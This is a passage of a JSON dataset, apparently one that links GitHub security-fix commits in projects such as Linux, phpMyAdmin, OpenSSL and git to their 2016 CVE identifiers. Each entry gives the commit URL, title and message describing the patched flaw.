    "title": "Merge branch 'stacking-fixes' (vfs stacking fixes from Jann)",
    "body": "Merge filesystem stacking fixes from Jann Horn.* emailed patches from Jann Horn <jannh@google.com>: sched: panic on corrupted stack end ecryptfs: forbid opening files without mmap handler proc: prevent stacking filesystems on top",
    "cveIds": [
      "CVE-2016-1583"
    ],
    "cveIdsCount": 1
  },
  "fc0fe5d19f43861b24a081578ed79f83f9db841cba26ba42e888df391793f587": {
    "url": "https://github.com/torvalds/linux/commit/f0fe970df3838c202ef6c07a4c2b36838ef0a88b",
    "title": "ecryptfs: don't allow mmap when the lower fs doesn't support it",
    "body": "There are legitimate reasons to disallow mmap on certain files, notablyin sysfs or procfs. We shouldn't emulate mmap support on file systemsthat don't offer support natively.CVE-2016-1583Signed-off-by: Jeff Mahoney <jeffm@suse.com>Cc: stable@vger.kernel.org[tyhicks: clean up f_op check by using ecryptfs_file_to_lower()]Signed-off-by: Tyler Hicks <tyhicks@canonical.com>",
    "cveIds": [
      "CVE-2016-1583"
    ],
    "cveIdsCount": 1
  },
  "8bbf48209dd6b79630b5d996bef20d7131ada5c8b08a2253584cef239d37d8c2": {
    "url": "https://github.com/googlei18n/sfntly/commit/468cad540fa1b0027cad60456f53feabecdce2bc",
    "title": "Merge pull request #56 from leizleiz/bytearray",
    "body": "Add a bounds check to ByteArray::Get().",
    "cveIds": [
      "CVE-2016-1709"
    ],
    "cveIdsCount": 1
  },
  "9a483198c60d9f8d1d49592d69f6f4cf60788f1860ff08524235cc4e7561e00c": {
    "url": "https://github.com/php/php-src/commit/2871c70efaaaa0f102557a17c727fd4d5204dd4b",
    "title": "Patch for Heap Buffer Overflow in EscapeShell",
    "body": "Proposed patch for bug #71270",
    "cveIds": [
      "CVE-2016-1904"
    ],
    "cveIdsCount": 1
  },
  "26a63945a9d19645b6c5dc19c507d190c2c3131be46225b54ab86eebdd9fb3c3": {
    "url": "https://github.com/GPCsolutions/dolibarr/commit/0d3181324c816bdf664ca5e1548dfe8eb05c54f8",
    "title": "FIX Dolibarr#2857, Dolibarr#4291 & Dolibarr#4341 Escape GETPOST alpha…",
    "body": "… data by defaultThis should mitigate most HTML injections allowing XSS.",
    "cveIds": [
      "CVE-2016-1912"
    ],
    "cveIdsCount": 1
  },
  "1494db64bc8fb4af386a3f5024648587f8ce51c3277e8ed119028f55ddb06eb1": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/76b10187c38634a29d6780f99f6dcd796191073b",
    "title": "Fallback to default collation connection",
    "body": "If user supplied wrong string we should gracefully fallback.Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-2038"
    ],
    "cveIdsCount": 1
  },
  "2c73f17a74e58b1eae83694fb12b4be384b813ba19d3fdcf7fb86425e1d1542c": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/447c88f4884fe30a25d38c331c31d820a19f8c93",
    "title": "Can not use PMA_fatalError when including fails",
    "body": "Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-2038"
    ],
    "cveIdsCount": 1
  },
  "4dc55a0bc508208a0fa09170da1af552ebc1d88c6aeb688a1111365384a56a37": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/5aee5035646c4fc617564cb0d3d58c0435d64d81",
    "title": "Fix path disclosure, items 1.4.x, 1.5 and 1.6",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2016-2038"
    ],
    "cveIdsCount": 1
  },
  "16d7b7ec8b1667970f7f09f863dac49ef82af8402d2c53afcfca048a9af01f36": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/f83b52737e321005959497d8e8f59f8aaedc9048",
    "title": "Do not process subforms with PMA_MINIMUM_COMMON",
    "body": "In such case needed infrastructure is not loaded, so related code won'twork anyway.Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-2038"
    ],
    "cveIdsCount": 1
  },
  "7bfaf5d7b20d893d71c52e484de0ef0113bb1e619aba569bf097f71c571e91d3": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/d4b9c22c1f8465bda5b6a83dc7e2cf59c3fe44e1",
    "title": "Enable localization before redirect",
    "body": "This is needed in case of IIS which needs full HTML response.Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-2038"
    ],
    "cveIdsCount": 1
  },
  "82515e29465b700858342dad1f82d2776b6b78d7dc6436d8e836896c73f5d1b4": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/85ccdbb5b9c6c7a9830e5cb468662837a59a7aa3",
    "title": "Include common libraries in setup",
    "body": "We use PMA_fatalError which in turn needs Response and related objects.Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-2038"
    ],
    "cveIdsCount": 1
  },
  "7d6780111efea08d01f913cc213eec08baa933b64888f6306483d6c0f4292348": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/cb7748ac9cffcd1cd0f3081499cd4aafa9d1065e",
    "title": "Update phpseclib to 2.0.1",
    "body": "New version uses PHP 7.0 random_bytes to generate cryptographically securepseudo-random bytes.Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-2039"
    ],
    "cveIdsCount": 1
  },
  "1991cbdce650a905782751ed539e9ca0812d0a4465ba154a6ab8d8d0ccecd95a": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/f20970d32c3dfdf82aef7b6c244da1f769043813",
    "title": "Use phpseclib's Crypt::Random to generate CSRF token",
    "body": "Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-2039"
    ],
    "cveIdsCount": 1
  },
  "d00168f629b32b54354ffcecf28689ae160d3b273e4b763ef086a5819ae24869": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/edffb52884b09562490081c3b8666ef46c296418",
    "title": "Fix XSS in zoom search",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2016-2040"
    ],
    "cveIdsCount": 1
  },
  "8c9eccd53085ed1661944a9bc2e4fb4d67b642b999d155b586c76781b8b1d3d1": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/aca42efa01917cc0fe8cfdb2927a6399ca1742f2",
    "title": "Escape javascript variable content",
    "body": "Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-2040"
    ],
    "cveIdsCount": 1
  },
  "d4894a917bf127ed169769f27f98af3ca6af6ef9dfbb983e2e8dae7cb3a18df1": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/75a55824012406a08c4debf5ddb7ae41c32a7dbc",
    "title": "Fix XSS in DB_search.php",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2016-2040"
    ],
    "cveIdsCount": 1
  },
  "712d7995ec15eb9e1466784fbdb32868310fb66cfe99c1b277305ca5ca507e1a": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/5a3de108f26e4b0dddadddbe8ccdb1dd5526771f",
    "title": "Avoid execution outside phpMyAdmin",
    "body": "This is hacky, but avoids path disclossure on direct access to thescripts.Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-2042"
    ],
    "cveIdsCount": 1
  },
  "8c848a6d81e3c74d2ae5f94abe2b7a6890d77cb914df64a8312d2d879f30ad17": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/019c4f25d500ec5db9ba3b84cc961a7e4e850738",
    "title": "Fix XSS in normalization.php",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2016-2043"
    ],
    "cveIdsCount": 1
  },
  "36bd17516e0fd13645eefc385dec3a3fc93a77f2a28f4ec67467c284df518205": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/c57d3cc7b97b5f32801032f7bb222297aa97dfea",
    "title": "Avoid invalid invocation of SQL parser",
    "body": "Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-2044"
    ],
    "cveIdsCount": 1
  },
  "4a322a7091a08563a7f0f70bfc0b24302c755947ebbc2ea2e7c199db363baa04": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/0a24f92d081033576bfdd9d4bdec1a54501734c1",
    "title": "Set correct content type for JSON responses",
    "body": "Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-2045"
    ],
    "cveIdsCount": 1
  },
  "2c151bdd00cbdfc0c0f8e1241df3ae54975a7937bcb1e8e0726f38f249cc1d29": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/11496890d7e21786cbfd9fd17ab968f498116b3f",
    "title": "Tell jQuery we're expecting JSON here",
    "body": "It's better to be explicit rather than relying on autodetection.Signed-off-by: Michal Čihař <michal@cihar.com>",
    "cveIds": [
      "CVE-2016-2045"
    ],
    "cveIdsCount": 1
  },
  "6ddda73feb5030520cd19343460599481d08b7ed0f2076f29edc2cd0db7ea8de": {
    "url": "https://github.com/torvalds/linux/commit/0d62e9dd6da45bbf0f33a8617afc5fe774c8f45f",
    "title": "ASN.1: Fix non-match detection failure on data overrun",
    "body": "If the ASN.1 decoder is asked to parse a sequence of objects, non-optionalmatches get skipped if there's no more data to be had rather than adata-overrun error being reported.This is due to the code segment that decides whether to skip optionalmatches (ie. matches that could get ignored because an element is markedOPTIONAL in the grammar) due to a lack of data also skips non-optionalelements if the data pointer has reached the end of the buffer.This can be tested with the data decoder for the new RSA akcipher algorithmthat takes three non-optional integers. Currently, it skips the lastinteger if there is insufficient data.Without the fix, #defining DEBUG in asn1_decoder.c will show somethinglike:next_op: pc=0/13 dp=0/270 C=0 J=0- match? 30 30 00- TAG: 30 266 CONSnext_op: pc=2/13 dp=4/270 C=1 J=0- match? 02 02 00- TAG: 02 257- LEAF: 257next_op: pc=5/13 dp=265/270 C=1 J=0- match? 02 02 00- TAG: 02 3- LEAF: 3next_op: pc=8/13 dp=270/270 C=1 J=0next_op: pc=11/13 dp=270/270 C=1 J=0- end cons t=4 dp=270 l=270/270The next_op line for pc=8/13 should be followed by a match line.This is not exploitable for X.509 certificates by means of shortening themessage and fixing up the ASN.1 CONS tags because: (1) The relevant records being built up are cleared before use. (2) If the message is shortened sufficiently to remove the public key, the ASN.1 parse of the RSA key will fail quickly due to a lack of data. (3) Extracted signature data is either turned into MPIs (which cope with a 0 length) or is simpler integers specifying algoritms and suchlike (which can validly be 0); and (4) The AKID and SKID extensions are optional and their removal is handled without risking passing a NULL to asymmetric_key_generate_id(). (5) If the certificate is truncated sufficiently to remove the subject, issuer or serialNumber then the ASN.1 decoder will fail with a 'Cons stack underflow' return.This is not exploitable for PKCS#7 messages by means of removal of elementsfrom such a message from the tail end of a sequence: (1) Any shortened X.509 certs embedded in the PKCS#7 message are survivable as detailed above. (2) The message digest content isn't used if it shows a NULL pointer, similarly, the authattrs aren't used if that shows a NULL pointer. (3) A missing signature results in a NULL MPI - which the MPI routines deal with. (4) If data is NULL, it is expected that the message has detached content and that is handled appropriately. (5) If the serialNumber is excised, the unconditional action associated with it will pick up the containing SEQUENCE instead, so no NULL pointer will be seen here. If both the issuer and the serialNumber are excised, the ASN.1 decode will fail with an 'Unexpected tag' return. In either case, there's no way to get to asymmetric_key_generate_id() with a NULL pointer. (6) Other fields are decoded to simple integers. Shortening the message to omit an algorithm ID field will cause checks on this to fail early in the verification process.This can also be tested by snipping objects off of the end of the ASN.1 streamsuch that mandatory tags are removed - or even from the end of internalSEQUENCEs. If any mandatory tag is missing, the error EBADMSG *should* beproduced. Without this patch ERANGE or ENOPKG might be produced or the parsemay apparently succeed, perhaps with ENOKEY or EKEYREJECTED being producedlater, depending on what gets snipped.Just snipping off the final BIT_STRING or OCTET_STRING from either sampleshould be a start since both are mandatory and neither will cause an EBADMSGwithout the patchesReported-by: Marcel Holtmann <marcel@holtmann.org>Signed-off-by: David Howells <dhowells@redhat.com>Tested-by: Marcel Holtmann <marcel@holtmann.org>Reviewed-by: David Woodhouse <David.Woodhouse@intel.com>",
    "cveIds": [
      "CVE-2016-2053"
    ],
    "cveIdsCount": 1
  },
  "7199e1b57b591ebbd56712a2deee6e7c92e43a1448b808b888dd38aa30ea01e7": {
    "url": "https://github.com/torvalds/linux/commit/8b8a321ff72c785ed5e8b4cf6eda20b35d427390",
    "title": "tcp: fix zero cwnd in tcp_cwnd_reduction",
    "body": "Patch 3759824 (\"tcp: PRR uses CRB mode by default and SS modeconditionally\") introduced a bug that cwnd may become 0 when bothinflight and sndcnt are 0 (cwnd = inflight + sndcnt). This may leadto a div-by-zero if the connection starts another cwnd reductionphase by setting tp->prior_cwnd to the current cwnd (0) intcp_init_cwnd_reduction().To prevent this we skip PRR operation when nothing is acked orsacked. Then cwnd must be positive in all cases as long as ssthreshis positive:1) The proportional reduction mode inflight > ssthresh > 02) The reduction bound mode a) inflight == ssthresh > 0 b) inflight < ssthresh sndcnt > 0 since newly_acked_sacked > 0 and inflight < ssthreshTherefore in all cases inflight and sndcnt can not both be 0.We check invalid tp->prior_cwnd to avoid potential div0 bugs.In reality this bug is triggered only with a sequence of less commonevents. For example, the connection is terminating an ECN-triggeredcwnd reduction with an inflight 0, then it receives reordered/oldACKs or DSACKs from prior transmission (which acks nothing). Or theconnection is in fast recovery stage that marks everything lost,but fails to retransmit due to local issues, then receives datapackets from other end which acks nothing.Fixes: 3759824 (\"tcp: PRR uses CRB mode by default and SS mode conditionally\")Reported-by: Oleksandr Natalenko <oleksandr@natalenko.name>Signed-off-by: Yuchung Cheng <ycheng@google.com>Signed-off-by: Neal Cardwell <ncardwell@google.com>Signed-off-by: Eric Dumazet <edumazet@google.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2016-2070"
    ],
    "cveIdsCount": 1
  },
  "c4b8effcd64d156a176b3008f1abd4f2a8e1b05df899369feac36701a4d89926": {
    "url": "https://github.com/torvalds/linux/commit/f43bfaeddc79effbf3d0fcb53ca477cca66f3db8",
    "title": "atl2: Disable unimplemented scatter/gather feature",
    "body": "atl2 includes NETIF_F_SG in hw_features even though it has no supportfor non-linear skbs. This bug was originally harmless since thedriver does not claim to implement checksum offload and that used tobe a requirement for SG.Now that SG and checksum offload are independent features, if youexplicitly enable SG *and* use one of the rare protocols that can useSG without checkusm offload, this potentially leaks sensitiveinformation (before you notice that it just isn't working). Thereforethis obscure bug has been designated CVE-2016-2117.Reported-by: Justin Yackoski <jyackoski@crypto-nite.com>Signed-off-by: Ben Hutchings <ben@decadent.org.uk>Fixes: ec5f061 (\"net: Kill link between CSUM and SG features.\")Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2016-2117"
    ],
    "cveIdsCount": 1
  },
  "aa4bf688981d7e0dfbe898ca873513ae270927555d75e206bd4977aef96c0bfb": {
    "url": "https://github.com/torvalds/linux/commit/3446c13b268af86391d06611327006b059b8bab1",
    "title": "s390/mm: four page table levels vs. fork",
    "body": "The fork of a process with four page table levels is broken sincegit commit 6252d70 \"[S390] dynamic page tables.\"All new mm contexts are created with three page table levels andan asce limit of 4TB. If the parent has four levels dup_mmap willadd vmas to the new context which are outside of the asce limit.The subsequent call to copy_page_range will walk the three levelpage table structure of the new process with non-zero pgd and pudindexes. This leads to memory clobbers as the pgd_index *and* thepud_index is added to the mm->pgd pointer without a pgd_derefin between.The init_new_context() function is selecting the number of pagetable levels for a new context. The function is used by mm_init()which in turn is called by dup_mm() and mm_alloc(). These two areused by fork() and exec(). The init_new_context() function candistinguish the two cases by looking at mm->context.asce_limit,for fork() the mm struct has been copied and the number of pagetable levels may not change. For exec() the mm_alloc() functionset the new mm structure to zero, in this case a three-level pagetable is created as the temporary stack space is located atSTACK_TOP_MAX = 4TB.This fixes CVE-2016-2143.Reported-by: Marcin Kościelnicki <koriakin@0x04.net>Reviewed-by: Heiko Carstens <heiko.carstens@de.ibm.com>Cc: stable@vger.kernel.orgSigned-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>",
    "cveIds": [
      "CVE-2016-2143"
    ],
    "cveIdsCount": 1
  },
  "88acc0bbcc06c05f0cb25dd0dee610f85557b3979120bdb6213200b7c286129e": {
    "url": "https://github.com/openssl/openssl/commit/0ed26acce328ec16a3aa635f1ca37365e8c7403a",
    "title": "Fix OOB read in TS_OBJ_print_bio().",
    "body": "TS_OBJ_print_bio() misuses OBJ_txt2obj: it should print the resultas a null terminated buffer. The length value returned is the totallength the complete text reprsentation would need not the amount ofdata written.CVE-2016-2180Thanks to Shi Lei for reporting this bug.Reviewed-by: Matt Caswell <matt@openssl.org>",
    "cveIds": [
      "CVE-2016-2180"
    ],
    "cveIdsCount": 1
  },
  "8644253e37fde4b8fe891544cb38d6cfe90cfc7fe442409b1aefe75db66e0d1d": {
    "url": "https://github.com/horde/horde/commit/ab07a1b447de34e13983b4d7ceb18b58c3a358d8",
    "title": "[jan] SECURITY: Fix XSS vulnerability in menu bar exposed by only a f…",
    "body": "…ew applications (Bug #14213).",
    "cveIds": [
      "CVE-2016-2228"
    ],
    "cveIdsCount": 1
  },
  "8bc4df1673a5adb47fac525a70fcf7f5d51345cb7e1de223e17b69b339876a7e": {
    "url": "https://github.com/git/git/commit/34fa79a6cde56d6d428ab0d3160cb094ebad3305",
    "title": "prefer memcpy to strcpy",
    "body": "When we already know the length of a string (e.g., becausewe just malloc'd to fit it), it's nicer to use memcpy thanstrcpy, as it makes it more obvious that we are not going tooverflow the buffer (because the size we pass matches thesize in the allocation).This also eliminates calls to strcpy, which make auditingthe code base harder.Signed-off-by: Jeff King <peff@peff.net>Signed-off-by: Junio C Hamano <gitster@pobox.com>",
    "cveIds": [
      "CVE-2016-2315"
    ],
    "cveIdsCount": 1
  },
  "74a2c07e7d132fab9a4ca70972acbbd68dc61729a128811f04a25300f70efa07": {
    "url": "https://github.com/git/git/commit/de1e67d0703894cb6ea782e36abb63976ab07e60",
    "title": "list-objects: pass full pathname to callbacks",
    "body": "When we find a blob at \"a/b/c\", we currently pass this toour show_object_fn callbacks as two components: \"a/b/\" and\"c\". Callbacks which want the full value then callpath_name(), which concatenates the two. But this is aninefficient interface; the path is a strbuf, and we couldsimply append \"c\" to it temporarily, then roll back thelength, without creating a new copy.So we could improve this by teaching the callsites ofpath_name() this trick (and there are only 3). But we canalso notice that no callback actually cares about thebroken-down representation, and simply pass each callbackthe full path \"a/b/c\" as a string. The callback code becomeseven simpler, then, as we do not have to worry about freeingan allocated buffer, nor rolling back our modification tothe strbuf.This is theoretically less efficient, as some callbackswould not bother to format the final path component. But inpractice this is not measurable. Since we use the samestrbuf over and over, our work to grow it is amortized, andwe really only pay to memcpy a few bytes.Signed-off-by: Jeff King <peff@peff.net>Signed-off-by: Junio C Hamano <gitster@pobox.com>",
    "cveIds": [
      "CVE-2016-2315",
      "CVE-2016-2324"
    ],
    "cveIdsCount": 2
  },
  "937a536685862c4668b801b6ca147736eef467e8fcf7390ba82d5022c5f1aacd": {
    "url": "https://github.com/fragglet/lhasa/commit/6fcdb8f1f538b9d63e63a5fa199c5514a15d4564",
    "title": "Fix integer underflow vulnerability in L3 decode.",
    "body": "Marcin 'Icewall' Noga of Cisco TALOS discovered that the level 3 headerdecoding routines were vulnerable to an integer underflow, if the 32-bitheader length was less than the base level 3 header length. This couldlead to an exploitable heap corruption condition.Thanks go to Marcin Noga and Regina Wilson of Cisco TALOS for reportingthis vulnerability.",
    "cveIds": [
      "CVE-2016-2347"
    ],
    "cveIdsCount": 1
  },
  "83e3b87ee9fe0fcdc21de539cd7da8f5e475d8b3dd74f458a498c1fa00f9219e": {
    "url": "https://github.com/torvalds/linux/commit/a1b14d27ed0965838350f1377ff97c93ee383492",
    "title": "bpf: fix branch offset adjustment on backjumps after patching ctx exp…",
    "body": "…ansionWhen ctx access is used, the kernel often needs to expand/rewriteinstructions, so after that patching, branch offsets have to beadjusted for both forward and backward jumps in the new eBPF program,but for backward jumps it fails to account the delta. Meaning, forexample, if the expansion happens exactly on the insn that sits atthe jump target, it doesn't fix up the back jump offset.Analysis on what the check in adjust_branches() is currently doing: /* adjust offset of jmps if necessary */ if (i < pos && i + insn->off + 1 > pos) insn->off += delta; else if (i > pos && i + insn->off + 1 < pos) insn->off -= delta;First condition (forward jumps): Before: After: insns[0] insns[0] insns[1] <--- i/insn insns[1] <--- i/insn insns[2] <--- pos insns[P] <--- pos insns[3] insns[P] `------| delta insns[4] <--- target_X insns[P] `-----| insns[5] insns[3] insns[4] <--- target_X insns[5]First case is if we cross pos-boundary and the jump instruction wasbefore pos. This is handeled correctly. I.e. if i == pos, then thiswould mean our jump that we currently check was the patchlet itselfthat we just injected. Since such patchlets are self-contained andhave no awareness of any insns before or after the patched one, thedelta is correctly not adjusted. Also, for the second condition incase of i + insn->off + 1 == pos, means we jump to that newly patchedinstruction, so no offset adjustment are needed. That part is correct.Second condition (backward jumps): Before: After: insns[0] insns[0] insns[1] <--- target_X insns[1] <--- target_X insns[2] <--- pos <-- target_Y insns[P] <--- pos <-- target_Y insns[3] insns[P] `------| delta insns[4] <--- i/insn insns[P] `-----| insns[5] insns[3] insns[4] <--- i/insn insns[5]Second interesting case is where we cross pos-boundary and the jumpinstruction was after pos. Backward jump with i == pos would beimpossible and pose a bug somewhere in the patchlet, so the firstcondition checking i > pos is okay only by itself. However, i +insn->off + 1 < pos does not always work as intended to trigger theadjustment. It works when jump targets would be far off where thedelta wouldn't matter. But, for example, where the fixed insn->offbefore pointed to pos (target_Y), it now points to pos + delta, sothat additional room needs to be taken into account for the check.This means that i) both tests here need to be adjusted into pos + delta,and ii) for the second condition, the test needs to be <= as positself can be a target in the backjump, too.Fixes: 9bac3d6 (\"bpf: allow extended BPF programs access skb fields\")Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2016-2383"
    ],
    "cveIdsCount": 1
  },
  "4932a5178f3a330abd101e07eb92a2b22aa79027324e0b539be1ab6d6606266b": {
    "url": "https://github.com/kamailio/kamailio/commit/f50c9c853e7809810099c970780c30b0765b0643",
    "title": "seas: safety check for target buffer size before copying message in e…",
    "body": "…ncode_msg()- avoid buffer overflow for large SIP messages- reported by Stelios Tsampas",
    "cveIds": [
      "CVE-2016-2385"
    ],
    "cveIdsCount": 1
  },
  "61d248566cc59f01d59f2b5077649058681f09548bbdfa9abc6785dd4f4eba35": {
    "url": "https://github.com/django/django/commit/c5544d289233f501917e25970c03ed444abbd4f0",
    "title": "Fixed CVE-2016-2512 -- Prevented spoofing is_safe_url() with basic auth.",
    "body": "This is a security fix.",
    "cveIds": [
      "CVE-2016-2512"
    ],
    "cveIdsCount": 1
  },
  "90640c9f6e5ce96f5a88ce224b83ecd5983fdaf9e14ffbf25379c66994a53ae2": {
    "url": "https://github.com/libarchive/libarchive/commit/a550daeecf6bc689ade371349892ea17b5b97c77",
    "title": "Fix libarchive/archive_read_support_format_mtree.c:1388:11: error: ar…",
    "body": "…ray subscript is above array bounds",
    "cveIds": [
      "CVE-2016-4301"
    ],
    "cveIdsCount": 1
  },
  "a39be69137276db7399a1697fb8f4c6a9a1f40ce1d2e40f4befd1cb6d7fd96e3": {
    "url": "https://github.com/libarchive/libarchive/commit/05caadc7eedbef471ac9610809ba683f0c698700",
    "title": "Issue 719: Fix for TALOS-CAN-154",
    "body": "A RAR file with an invalid zero dictionary size was not beingrejected, leading to a zero-sized allocation for the dictionarystorage which was then overwritten during the dictionary initialization.Thanks to the Open Source and Threat Intelligence project at Cisco forreporting this.",
    "cveIds": [
      "CVE-2016-4302"
    ],
    "cveIdsCount": 1
  },
  "a74bd7045f695e127300796c559ba05bc2b60eb88716331e3949d9fb5c8f7727": {
    "url": "https://github.com/esnet/iperf/commit/91f2fa59e8ed80dfbf400add0164ee0e508e412a",
    "title": "Fix a buffer overflow / heap corruption issue that could occur if a",
    "body": "malformed JSON string was passed on the control channel. This issue,present in the cJSON library, was already fixed upstream, so wasaddressed here in iperf3 by importing a newer version of cJSON (pluslocal ESnet modifications).Discovered and reported by Dave McDaniel, Cisco Talos.Based on a patch by @dopheide-esnet, with input from @DaveGamble.Cross-references: TALOS-CAN-0164, ESNET-SECADV-2016-0001,CVE-2016-4303(cherry picked from commit ed94082)Signed-off-by: Bruce A. Mah <bmah@es.net>",
    "cveIds": [
      "CVE-2016-4303"
    ],
    "cveIdsCount": 1
  },
  "462811713e538d833b33ca128d3f0a853b39f6bc39a8e845ee2abaa658fca6f0": {
    "url": "https://github.com/akheron/jansson/pull/284/commits/64ce0ad3731ebd77e02897b07920eadd0e2cc318",
    "title": "Fix for issue #282",
    "body": "The fix limits recursion depths when parsing arrays and objects.The limit is configurable via the `JSON_PARSER_MAX_DEPTH` settingwithin `jansson_config.h` and is set by default to 2048.Update the RFC conformance document to note the limit; the RFCallows limits to be set by the implementation so nothing hasactually changed w.r.t. conformance state.Reported by Gustavo Grieco.",
    "cveIds": [
      "CVE-2016-4425"
    ],
    "cveIdsCount": 1
  },
  "1eb79b2c6a1e935696d84b259f93c9feadf84ce1c7e9466bc91a17ed231d0442": {
    "url": "https://github.com/torvalds/linux/commit/3ce424e45411cf5a13105e0386b6ecf6eeb4f66f",
    "title": "kvm:vmx: more complete state update on APICv on/off",
    "body": "The function to update APICv on/off state (in particular, to deactivateit when enabling Hyper-V SynIC) is incomplete: it doesn't adjustAPICv-related fields among secondary processor-based VM-executioncontrols. As a result, Windows 2012 guests get stuck when SynIC-basedauto-EOI interrupt intersected with e.g. an IPI in the guest.In addition, the MSR intercept bitmap isn't updated every time \"virtualizex2APIC mode\" is toggled. This path can only be triggered by a maliciousguest, because Windows didn't use x2APIC but rather their own syntheticAPIC access MSRs; however a guest running in a SynIC-enabled VM couldswitch to x2APIC and thus obtain direct access to host APIC MSRs(CVE-2016-4440).The patch fixes those omissions.Signed-off-by: Roman Kagan <rkagan@virtuozzo.com>Reported-by: Steve Rutherford <srutherford@google.com>Reported-by: Yang Zhang <yang.zhang.wz@gmail.com>Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>",
    "cveIds": [
      "CVE-2016-4440"
    ],
    "cveIdsCount": 1
  },
  "c4c60382d06c3b5bd676ab6696c04c3ce40b20d719dc4268ee74d3e872035cb8": {
    "url": "https://github.com/MiniProfiler/rack-mini-profiler/commit/4273771d65f1a7411e3ef5843329308d0e2d257c",
    "title": "FEATURE: perform security checks earlier in the pipeline",
    "body": "This avoids needing to discard results and ensures no areas of mini profilercan execute prior to a request being authorizedauthorization token lasts for 30 minutes and is cycled after that",
    "cveIds": [
      "CVE-2016-4442"
    ],
    "cveIdsCount": 1
  },
  "2646abbd653178049090eca1273f4df2dc564afa1841d732701b329e81d0def7": {
    "url": "https://github.com/torvalds/linux/commit/681fef8380eb818c0b845fca5d2ab1dcbab114ee",
    "title": "USB: usbfs: fix potential infoleak in devio",
    "body": "The stack object “ci” has a total size of 8 bytes. Its last 3 bytesare padding bytes which are not initialized and leaked to userlandvia “copy_to_user”.Signed-off-by: Kangjie Lu <kjlu@gatech.edu>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2016-4482"
    ],
    "cveIdsCount": 1
  },
  "e39143646a87d3096b49fb4266f25cc8d15eb897fe6ddf3a8410187f2794e28d": {
    "url": "https://github.com/torvalds/linux/commit/b8670c09f37bdf2847cc44f36511a53afc6161fd",
    "title": "net: fix infoleak in llc",
    "body": "The stack object “info” has a total size of 12 bytes. Its last byteis padding which is not initialized and leaked via “put_cmsg”.Signed-off-by: Kangjie Lu <kjlu@gatech.edu>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2016-4485"
    ],
    "cveIdsCount": 1
  },
  "ba7d5b5b5fe36747b2f29179ff22279e2fe7add8b88c6c820cc16546392440c8": {
    "url": "https://github.com/torvalds/linux/commit/5f8e44741f9f216e33736ea4ec65ca9ac03036e6",
    "title": "net: fix infoleak in rtnetlink",
    "body": "The stack object “map” has a total size of 32 bytes. Its last 4bytes are padding generated by compiler. These padding bytes arenot initialized and sent out via “nla_put”.Signed-off-by: Kangjie Lu <kjlu@gatech.edu>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2016-4486"
    ],
    "cveIdsCount": 1
  },
  "e7e6d46998d8f2d75bceeedd87fdb6fc7c2328f974ad804c69a089b934df86fb": {
    "url": "https://github.com/torvalds/linux/commit/e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3",
    "title": "IB/security: Restrict use of the write() interface",
    "body": "The drivers/infiniband stack uses write() as a replacement forbi-directional ioctl(). This is not safe. There are ways totrigger write calls that result in the return structure thatis normally written to user space being shunted off to userspecified kernel memory instead.For the immediate repair, detect and deny suspicious accesses tothe write API.For long term, update the user space libraries and the kernel APIto something that doesn't present the same security vulnerabilities(likely a structured ioctl() interface).The impacted uAPI interfaces are generally only available ifhardware from drivers/infiniband is installed in the system.Reported-by: Jann Horn <jann@thejh.net>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>Signed-off-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>[ Expanded check to all known write() entry points ]Cc: stable@vger.kernel.orgSigned-off-by: Doug Ledford <dledford@redhat.com>",
    "cveIds": [
      "CVE-2016-4565"
    ],
    "cveIdsCount": 1
  },
  "572f8f3eb2784f4ced25c2e6d1f4bb4d26118335afef9690effd1771818938bf": {
    "url": "https://github.com/torvalds/linux/commit/2c1f6951a8a82e6de0d82b1158b5e493fc6c54ab",
